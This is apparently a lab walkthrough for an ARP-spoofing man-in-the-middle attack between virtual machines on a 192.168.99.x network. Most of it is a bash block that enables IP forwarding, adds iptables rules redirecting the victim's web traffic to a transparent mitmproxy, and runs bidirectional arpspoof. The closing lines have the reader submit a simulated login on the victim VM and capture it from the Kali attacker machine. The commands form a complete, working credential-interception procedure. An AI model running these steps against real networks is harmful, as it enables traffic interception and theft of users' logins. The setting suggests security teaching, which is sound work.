```bash
which mitmproxy
which arpspoof

# check interface name (should be eth0)
ip -o -4 addr show | grep '192\.168\.99\.' -n

sudo sysctl -w net.ipv4.ip_forward=1

# HTTP redirect
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -d 192.168.99.2 --dport 80  -j REDIRECT --to-port 8080
# HTTPS redirect
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp -d 192.168.99.2 --dport 443 -j REDIRECT --to-port 8080

# confirm
sudo iptables -t nat -L PREROUTING -n -v --line-numbers | grep 192.168.99.2

sudo mitmproxy --mode transparent --listen-port 8080 --showhost

# you need 2 new terminal windows concurrently for ARP spoofing
# open a new terminal (terminal A)
sudo arpspoof -i <IFACE> -t 192.168.99.2 192.168.99.1
# open a new terminal (terminal B)
sudo arpspoof -i <IFACE> -t 192.168.99.1 192.168.99.2
```

And then, on the victim VM, open the browser and go to:
- http://victim.com (HTTP)

fill out the simulated login form and submit it, then get back to the attacker's VM (kali linux), if everything is correct, you should be able to capture the login information.